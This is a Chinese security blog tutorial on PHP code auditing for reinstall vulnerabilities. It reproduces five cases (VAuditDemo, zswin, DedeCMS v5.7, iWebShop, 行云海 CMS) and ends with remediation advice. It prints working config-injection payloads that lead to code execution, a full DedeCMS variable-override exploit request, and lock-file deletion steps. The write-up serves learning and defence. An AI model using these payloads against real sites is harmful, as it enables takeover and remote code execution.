# PHP 代码审计系列（一）重装漏洞

阅读量 **284811**

|评论 **4**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-11-08 10:30:13

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t016df10bc722c568a8.jpg)

## 前言

系统学习审计也有很长一段时间了，打算把期间复现的漏洞和各种知识做一些梳理，算是一个审计系列，希望能帮助到初学者入门。

这次说的重装漏洞在早年有很多，原因大多数是判断是否安装的部分写得不严谨，而到了现在以结合其他漏洞存在导致 RCE
的占多数，因为任意删除文件导致的是最常见的。

总之，如有不当，烦请评论捉虫，我会在第一时间响应并评论提示错误，谢谢。

## 重装漏洞的种类

1.自动删除这个安装文件

通过生成一个 lock 文件来判断程序是否安装过。

2.根本无验证

安装完成后不会自动删除文件，又不会生成 lock 判断是否安装过。

3.安装file

直接用 GET 提交 step 绕过，直接进入下一步。

如果安装过程中存在多个页面，而且在第一个页面存在判断是否安装，可以通过直接访问后面的页面进行重装。

说白了就是安装步骤中所有页面并非都经过了 lock 文件的验证，可以直接访问。

4.变量覆盖导致重装

可以 GET，POST，COOKIE 任意提交一个变量名 insLockfile ，给其赋空值，覆盖掉​ insLockfile ，从而让
file_exists 为 false 就不会退出。

5.判断 lock 后，无exit

判断是否存在 lock 文件，如果存在 lock 文件，就会 header 到 index.php ，但是 header 后并没有 exit
，所以并不会退出，类似的还有 javascript 弹个框。

6.解析漏洞

在安装完成后会将 install.php 重命名为 index.php.bak ，但是由于 Apache
的解析漏洞：如果无法识别到最后一个后缀的话，就会向上解析，那么就又变成了 php 了，然后结合安装时的变量覆盖又成重装了。

7.满足一些条件不会退出的

上述都是某牛课程里的总结，但我觉得太散了不够泛，我个人觉得精简成下面这样更好理解，每个附加了几个案例方便实践，有的在下面漏洞复现会提到：

1.没有 lock 文件验证

2.有 lock 文件验证

(1) 没有 exit 只用了 header 重定向 / 满足一些条件没有结束进程（比如虽然有 exit 但并不影响其他页面）。

这种可以通过安装过程中填写信息闭合写入配置文件利用。

(2) 安装步骤的所有页面并非都进行了 lock 文件验证，也就是验证缺陷。

这种可以直接跳步骤来利用。

CVE-2019-16314 indexhibit cms v2.1.5 重装漏洞就是这个原因。

(3) 组合拳导致重装，也就是上面两种都有，且严格，但可以通过其他漏洞删除 lock 文件 / 修改（如果是判断 lock 文件内容 / 某个 lock
相关变量）重装。

DedeCMS v5.7 的重装漏洞就是属于判断 lock 相关的一个变量，可以通过变量覆盖加解析漏洞组合来重装。

而 iWebShop v5.9.21010 则是通过任意删除文件从而删除了 lock 文件来重装。

## 漏洞复现

以下复现了五个漏洞，由浅入深，由易到难，都是我认为比较具有代表性的，作为一个集锦以供大家参考。

前三个仅作为学习参考，现在比较少见了，后两个是现在普遍有所存在的，利用的好就是高危。

源码[戳我下载](https://blacksun.lanzoui.com/iLZEwvtxeeb)

###  VAuditDemo 重装漏洞

漏洞成因：有 lock 文件验证但无 exit

对应上述种类的第五种，漏洞代码如下：

![](https://p3.ssl.qhimg.com/t01f0483557b451915a.jpg)

这里虽然进行了 lock 文件的验证，但在重定向到 index.php 之后并没有结束进程，所以可以在安装页面抓包修改数据作为该 if
语句之后的代码执行，从而导致了重装漏洞。

我们来看安装页面提交的数据部分：

    
    
    if ( $_POST ) {
    
        ...
    
        $dbhost = $_POST["dbhost"];
        $dbuser = $_POST["dbuser"];
        $dbpass = $_POST["dbpass"];
        $dbname = $_POST["dbname"];
    
        ...
    
        // exp;-- -";phpinfo();//
    
        mysql_query( "CREATE DATABASE $dbname", $con ) or die ( mysql_error() );
    
        $str_tmp="<?php\r\n";
        $str_end="?>";
        $str_tmp.="\r\n";
        $str_tmp.="error_reporting(0);\r\n";
        $str_tmp.="\r\n";
        $str_tmp.="if (!file_exists(\$_SERVER[\"DOCUMENT_ROOT\"].'/sys/install.lock')){\r\n\theader(\"Location: /install/install.php\");\r\nexit;\r\n}\r\n";
        $str_tmp.="\r\n";
        $str_tmp.="include_once('../sys/lib.php');\r\n";
        $str_tmp.="\r\n";
        $str_tmp.="\$host=\"$dbhost\"; \r\n";
        $str_tmp.="\$username=\"$dbuser\"; \r\n";
        $str_tmp.="\$password=\"$dbpass\"; \r\n";
        $str_tmp.="\$database=\"$dbname\"; \r\n";
        $str_tmp.="\r\n";
        $str_tmp.="\$conn = mysql_connect(\$host,\$username,\$password);\r\n";
        $str_tmp.="mysql_query('set names utf8',\$conn);\r\n";
        $str_tmp.="mysql_select_db(\$database, \$conn) or die(mysql_error());\r\n";
        $str_tmp.="if (!\$conn)\r\n";
        $str_tmp.="{\r\n";
        $str_tmp.="\tdie('Could not connect: ' . mysql_error());\r\n";
        $str_tmp.="\texit;\r\n";
        $str_tmp.="}\r\n";
        $str_tmp.="\r\n";
        $str_tmp.="session_start();\r\n";
        $str_tmp.="\r\n";
        $str_tmp.=$str_end;
    
        $fp=fopen( "../sys/config.php", "w" );
        fwrite( $fp, $str_tmp );
        fclose( $fp );
    
        ...
    

可以看到 $dbxx 四个参数都没有经过任何过滤就作为 php 文件的一部分拼接到了一起，并且写入了 /sys/config.php 文件当中。

本质上这个文件还是在对是否安装以及数据库连接进行检验。

    
    
    <?php
        error_reporting(0);
        if (!file_exists($_SERVER["DOCUMENT_ROOT"].'/sys/install.lock')){
            theader("Location: /install/install.php");
            exit;
        }
        include_once('../sys/lib.php');
        $host=$dbhost;
        $username=$dbuser;
        $password=$dbpass;
        $database=$dbname;
        $conn = mysql_connect($host,$username,$password);
        mysql_query('set names utf8',$conn);
        mysql_select_db($database, $conn) or die(mysql_error());
        if (!$conn){
            die('Could not connect: ' . mysql_error());
            exit;
        }
        session_start();
    >
    

$dbname 是我们可控且能修改的，对应 payload：

    
    
    ;-- -";phpinfo();//
    
    ps:-- - 是为了注释 sql 语句后面的部分，后面的 - 只是为了突出-- 后的空格，并不必要。
    

拼接到一起即：

![](https://p5.ssl.qhimg.com/t015b0acb8835bd6e9c.png)

而安装后的 index.php 会包含这个 config.php 文件：

![](https://p4.ssl.qhimg.com/t01f7e820343ae88212.png)

所以可以直接在主页看到 phpinfo 界面，当然也可以拼接一句话木马 getshell 。

利用过程：

![](https://p5.ssl.qhimg.com/t01239e60d8f170c467.jpg)

payload：

![](https://p4.ssl.qhimg.com/t01d018f8d8bf28dae2.jpg)

访问主页：

![](https://p1.ssl.qhimg.com/t01fbc2555f2c434923.jpg)

###  zswin v2.6 博客重装漏洞

漏洞成因：可直接进入安装页面验证缺陷 + 无 exit

漏洞在于 Install/Install/Controller/IndexController.class.php 中：

![](https://p5.ssl.qhimg.com/t01f26d944b8cafafff.jpg)

zswin 是 tp 框架，我们可以看到 index 方法对于 lock
文件的验证并没有在控制器的初始化方法中，也就是说即使没有通过验证，也不影响安装，且安装页面没有对 lock 文件的验证，安装后也可访问，就可进行重装。

接下来我们来看执行安装的数据部分：

    
    
    public function finish_done() {
    
            ...
    
            $this->_show_process('注册创始人帐号');
    
            //注册创始人帐号
            //修改配置文件
            $auth  = build_auth_key();
            // 这些数据都没有进行过滤检查
            $config_data['DB_TYPE'] = $temp_info['db_type'];
            $config_data['DB_HOST'] = $temp_info['db_host'];
            $config_data['DB_NAME'] = $temp_info['db_name'];
            $config_data['DB_USER'] = $temp_info['db_user'];
            $config_data['DB_PWD'] = $temp_info['db_pass'];
            $config_data['DB_PORT'] = $temp_info['db_port'];
            $config_data['DB_PREFIX'] = $temp_info['db_prefix'];
            $db = Db::getInstance($config_data);
            $config_data['WEB_MD5'] = $auth;
            // write_config 本质就是把 sqldata 下的信息写入配置文件
            $conf     =    write_config($config_data);
            // Install/Install/Common/function.php
            // function write_config($config, $auth){
            //    if(is_array($config)){
            //        //读取配置内容
            //        $conf = file_get_contents(MODULE_PATH . 'sqldata/conf.tpl');
            //        $user = file_get_contents(MODULE_PATH . 'sqldata/user.tpl');
            //        //替换配置项
            //        foreach ($config as $name => $value) {
            //            $conf = str_replace("[{$name}]", $value, $conf);
            //            $user = str_replace("[{$name}]", $value, $user);
            //        }
            //        //写入应用配置文件
            //        file_put_contents('./App/Common/Conf/config.php', $conf);
            //        file_put_contents('./App/User/Conf/config.php', $user);
            //        return '';
            //    }
            //}
            register_administrator($db, $temp_info['db_prefix'], $temp_info, $auth);
    
             $this->_show_process('注册创始人帐号成功');
             //锁定安装程序
            touch('./Data/install.lock');
    
            ...
    

来看 sqldata 下的配置内容：

user.tpl

    
    
    <?php
    
    /**
     * UCenter客户端配置文件
     * 注意：该配置文件请使用常量方式定义
     */
    
    define('UC_APP_ID', 1); //应用ID
    define('UC_API_TYPE', 'Model'); //可选值 Model / Service
    define('UC_AUTH_KEY', '[WEB_MD5]'); //加密KEY
    define('UC_DB_DSN', '[DB_TYPE]://[DB_USER]:[DB_PWD]@[DB_HOST]:[DB_PORT]/[DB_NAME]'); // 数据库连接，使用Model方式调用API必须配置此项
    define('UC_TABLE_PREFIX', '[DB_PREFIX]'); // 数据表前缀，使用Model方式调用API必须配置此项
    

由上我们可以利用 DB_PREFIX 闭合（在最后一条方便处理）拼入 config.php 文件，其实和 VAuditDemo 的思路差不多。

    
    
    zs_');phpinfo();//
    
    // 拼接的效果：
    define('UC_TABLE_PREFIX', 'zs_');
    phpinfo();
    //); // 数据表前缀，使用Model方式调用API必须配置此项
    

利用过程：

![](https://p0.ssl.qhimg.com/t012a68fe5ebf6fe0ea.jpg)

访问 /App/User/Conf/config.php 文件：

![](https://p0.ssl.qhimg.com/t01074475c7df333800.jpg)

###  DedeCMS v5.7 重装漏洞

漏洞成因：利用 Apache 解析漏洞 + 变量覆盖

这个漏洞利用条件必须存在 Apache 的解析漏洞，而 DedeCMS 在安装后会把安装文件 /install/index.php 备份成
/install/index.php.bak ，存在解析漏洞时可以作为 .php 文件执行。

关于 Apache 的解析漏洞我觉得还是有必要有点说明：

> 参考 [Apache解析漏洞详解 – milantgh – 博客园
> (cnblogs.com)](https://www.cnblogs.com/milantgh/p/5116955.html)
>
> 并非网上所说的“低版本的 Apache 存在未知扩展名解析漏洞”。
>
> 应该是使用 module 模式与 php 结合的所有版本 Apache 存在未知扩展名解析漏洞，使用 fastcgi 模式与 php 结合的所有版本
> Apache 不存在此漏洞。并且，想利用此漏洞必须保证文件扩展名中至少带有一个 .php ，否则将默认被作为 txt/html 文档处理。

另外，这也就要求利用前 install 文件夹本身没有被删除。

我们先执行安装一次，可见 /install 目录下已经有了 index.php 的备份 .bak 文件以及 lock 文件：

![](https://p3.ssl.qhimg.com/t0138f8ab4e61a52c00.png)

直接访问安装页面会提示已经安装：

![](https://p5.ssl.qhimg.com/t01cff209f8ffd528c5.jpg)

接下来我们来看 index.php.bak 文件，对其进行分析：

    
    
    <?php
    
    ...
    
    $insLockfile = dirname(__FILE__).'/install_lock.txt';
    
    ...
    
    // （1）这段的意思是，遍历数组（即通过 HTTP GET/POST/Cookies 方式传递的变量的数组）将其读取到的参数赋给 $_request，再遍历将其以键值对的形式赋值给 $_k、$_v，${$_k} 的值是 $_v 进行 RunMagicQuotes 过滤后的值。
    // （3）但这里存在变量覆盖漏洞，原因是 $$_request 是引用变量，且用了 foreach 进行键值对赋值，假设我们自己传入 $insLockfile 为 snovving（随意字符串），那么 $_k 则为 insLockfile ，而 $_v 则为 snovving，${$_k}（引用 $_k 的值作为变量名） 即为 $insLockfile ，那么赋值后即 $insLockfile 的值为 snovving ，但 snovving 文件是不存在的，所以我们可以绕过验证进行重装。
    foreach(Array('_GET','_POST','_COOKIE') as $_request)
    {
        foreach($$_request as $_k => $_v) ${$_k} = RunMagicQuotes($_v);
    }
    // RunMagicQuotes 这个过滤函数主要是为了防注入，对于一般字符串并没有什么作用
    // install/install.inc.php 
    //function RunMagicQuotes(&$str)
    //{
    //    if(!get_magic_quotes_gpc()) {
    //        if( is_array($str) )
    //            foreach($str as $key => $val) $str[$key] = RunMagicQuotes($val);
    //        else
    //            $str = addslashes($str);
    //    }
    //    return $str;
    //}
    
    require_once(DEDEINC.'/common.func.php');
    
    // （2）这判断 $insLockfile 这个变量值（即 lock 文件“正确”的绝对路径）是否存在 lock 文件，如果不存在则可重装。
    if(file_exists($insLockfile))
    {
        exit(" 程序已运行安装，如果你确定要重新安装，请先从FTP中删除 install/install_lock.txt！");
    }
    
    if(empty($step))
    {
        $step = 1;
    }
    
    ...
    

由上代码注释中的 3 点分析，我们可以这样构造 payload（参照法师前辈的）：

    
    
    http://www.localhost.com/install/index.php.bak?insLockfile=snovving&step=4
    
    POST
    step=4&dbhost=localhost&dbuser=root&dbpwd=123456&dbprefix=dede_&dbname=dedecms1&dblang=gbk&adminuser=admin&adminpwd=admin&cookieencode=JzIVw7439H&webname=%CE%D2%B5%C4%CD%F8%D5%BE&adminmail=admin%40dedecms.com&baseurl=http%3A%2F%2Flocalhost&cmspath=%2Fdedecms
    

step 4 对应 step 3 填写完数据后的安装过程，这样即可重装成功。

因为漏洞太过古早，phpstudy 早已没有相对应 Apache 的版本可供实现，所以仅在理论上梳理了一遍此漏洞，接下来对比 Dedecms 补丁后的
SP1 是如何修复此漏洞的：

![](https://p1.ssl.qhimg.com/t014051bac0ce3b0088.jpg)

如图使用了 define 定义为常量，也就无法通过传参来利用变量覆盖了。

最后学习一下 [DedeCMS 5.7通用重装漏洞 + PoC分析 – BT’s blog
(bt7k.com)](https://bt7k.com/?p=26) 的技巧优化点，列在这方便查阅：

>   1. $insLockfile 值最好用随机数，防止 /install 目录下恰巧有这个文件。
>   2. 漏洞点是 index.php、index.php.bak文件，可以用字典试一下（ Apache 的解析漏洞实在很少了）。
>   3. 判断响应包时建议找全版本通用的固定出现的字符串，并选出多个 verify_key ，逐个判断，杜绝误报。
>   4. user-agent 最好伪造。
>

这种类型还在 XDCMS v1.0 中出现过。

###  iWebShop v5.9.21010 重装漏洞导致 RCE

参考 [iWebShop开源商城系统V5.9.21010存在命令执行漏洞_Y4tacker的博客-CSDN博客](https://blog.csdn.net/solitudi/article/details/118029055)
，复现学习一下，师傅本人写的已经很清楚了，在这仅进行一些补充，我觉得这是个很好的例子，这涉及到了利用其他漏洞删除 lock 文件来重装。

![](https://p1.ssl.qhimg.com/t01fa8c904426db2c4c.jpg)

其实重装漏洞只要删除 install 文件基本没那么多事了。

首先进行前置工作，我们先登录后台，在 会员->商户管理->添加商户 处添加一个商户。

![](https://p3.ssl.qhimg.com/t019aeb222dd5aaa590.png)

然后再在首页的商家管理处登录。

![](https://p2.ssl.qhimg.com/t01c55068a3f31fc88f.png)

随便添加一个商品。

![](https://p3.ssl.qhimg.com/t018b1d1752bd83ad03.png)

添加之后回到后台，对这三个表进行备份，并下载备份文件：

![](https://p5.ssl.qhimg.com/t014186c9b4ec07b37c.png)

对备份文件进行如下修改：

![](https://p4.ssl.qhimg.com/t01684901b9bf1e9d1c.png)

很简单可以看到 iwebshop_goods 和 iwebshop_goods_photo 是通过一个中间表
iwebshop_goods_photo_relation 连接起来的，iwebshop_goods 的 id 从
iwebshop_goods_photo_relation 查找到 iwebshop_goods_photo 表对应的图片 id 。

这里的 2 对应的就是商品图片的 id ，无论修改为什么数字只要对应上就好，原来是图片的 md5 值，这里为了方便演示改为了 2 ，并且把商品图片的路径从
uploads/xxx.jpg 改为 lock 文件的目录即可。

这时候 /install 目录下的 lock 文件还在。

![](https://p5.ssl.qhimg.com/t016ae76cc86f3cf559.jpg)

修改后再在后台进行本地导入，成功后回到商家管理界面删除我们刚才添加的商品。

![](https://p2.ssl.qhimg.com/t01cf055b2b840a00dc.jpg)

删除后再看 lock 文件已经作为该商品的“图片”一并删除了：

![](https://p4.ssl.qhimg.com/t01599058a707db9322.jpg)

这样我们再次访问安装页面即可重装，接下来也是常规的找能写入配置文件的数据闭合达到 RCE 的目的。

![](https://p3.ssl.qhimg.com/t01a933905227bc6a53.png)

payload：

    
    
    hacktest','snovving'=>phpinfo()))))?>
    

安装完成后访问前台：

![](https://p4.ssl.qhimg.com/t0175bc06a4059a84c2.png)

接下来我们来看代码层面是什么样的。

首先看导致任意文件删除部分，对应后台上传备份文件的地方，找到相应控制器部分：

![](https://p0.ssl.qhimg.com/t01f1886cf3baa6661b.png)

controllers/tools.php

![](https://p2.ssl.qhimg.com/t018444b303e3a6ee80.png)

classes/dbbackup.php 中 parseSQL 对备份文件进行解析时，根据截取的前 2 字符判断SQL类型：

![](https://p2.ssl.qhimg.com/t01ea075f4151856b6e.png)

而我们之前下载的备份文件是以 `DROP TABLE IF EXISTS iwebshop_goods;` 开头，进入默认分支：

![](https://p5.ssl.qhimg.com/t014bd9eaca0c2139a1.png)

可以看到只对进入分支的每行数据添加了 `;` 来分句，并无其他过滤。

![](https://p5.ssl.qhimg.com/t01d5302105f5a8eea4.png)

而上传完备份文件后，我们来看商家管理删除商品的部分。

controllers/seller.php

![](https://p1.ssl.qhimg.com/t01ff7fc697277d436c.png)

跟进 del ：

classes/goods_class.php

![](https://p1.ssl.qhimg.com/t01a108e8ab661e5675.png)

对删除的文件也没有任何限制就直接 unlink 删除了。

关于寻找配置信息构造闭合的部分，可以从 install/index.php 入手。

![](https://p5.ssl.qhimg.com/t0193100474631380f7.png)

install/include/function.php

![](https://p1.ssl.qhimg.com/t0180c7a1ef98f8d770.png)

跟踪 create_config ：

![](https://p2.ssl.qhimg.com/t0179d7f900dd454a86.png)

可以看到没有任何过滤。

构造部分，可以参照与 config.php 默认的模板文件：

![](https://p2.ssl.qhimg.com/t01b62f64cd77bc4c67.png)

db_name 是最后的参数，且是我们可控的，我们可以利用这个传入 phpinfo 并闭合前面 array 并添加 php 文件结尾避免后面的 `')`
等字符干扰，就得到 payload ：

    
    
    hacktest','snovving'=>phpinfo()))))?>
    

![](https://p5.ssl.qhimg.com/t013ee211ef3a83e02c.png)

因为后台修改商品导致任意文件删除导致重装还有 WFPHP 也曾经存在这个问题。

###  行云海 CMS 重装漏洞

![](https://p4.ssl.qhimg.com/t0145bad3e8d4fcc34e.png)

tp 框架，先安装一遍。

一般任意文件删除可以用 Seay 或者全局搜索 unlink 发现，审计整个项目的时候可以从一些公共类文件入手（比如放在什么 /inc 文件目录下的或名称有
.class 的），更别说是数据库相关的方法了，这次的漏洞就在于：

![](https://p5.ssl.qhimg.com/t01c8959f5eaefe9235.png)

App/Manage/Controller/DatabaseController.class.php

![](https://p3.ssl.qhimg.com/t015ef02105da27c2c8.png)

也是对删除文件没有限制就删除了。

路径：

![](https://p2.ssl.qhimg.com/t01d30b559d67ecc77d.png)

登录后台，找到了数据库管理模块（这里其实对 tp 框架路由有了解的直接访问 s=/Database/方法 即可 ）

![](https://p0.ssl.qhimg.com/t012ac9d304898d772b.png)

随便给几个表备份一下，这里我们利用 POST 传递 lock 文件的路径（关于这个个人习惯是 POST 最好利用，因为 GET 有 URL
编码限制，请求提交的数据还有长度限制，很多时候比不上 POST 方便安全，当然这里也可以通过 GET 发送 payload，一般 GET 只读，而 POST
写），我们在批量删除的时候抓包复制下 url 。

根据目录改成 lock 文件相对的路径再发包即可。

![](https://p2.ssl.qhimg.com/t01cd6369672efe686e.png)

  
前台删除导致重装的可以参考一下天目 MVC Home 版 T2.13 的重装漏洞。

## 修复建议&一些思考

1.正确处理 lock 文件  
2.判断安装完成后要退出  
3.在安装的每一步都要进行验证  
4.所有输入点都要进行过滤，特别涉及到数据库的操作  
5.最后的最后，就是删除 /install 文件，多看看安装后的温馨提示

另外实际渗透中，涉及一些重要数据还是不要利用重装漏洞，毕竟最珍贵的还是数据。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **snovving** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/257476](/post/id/257476)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [代码审计](/tag/代码审计)

 **+1** __3赞

 __收藏

![](https://p5.ssl.qhimg.com/t010d65b2fc371a68f8.png) snovving

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

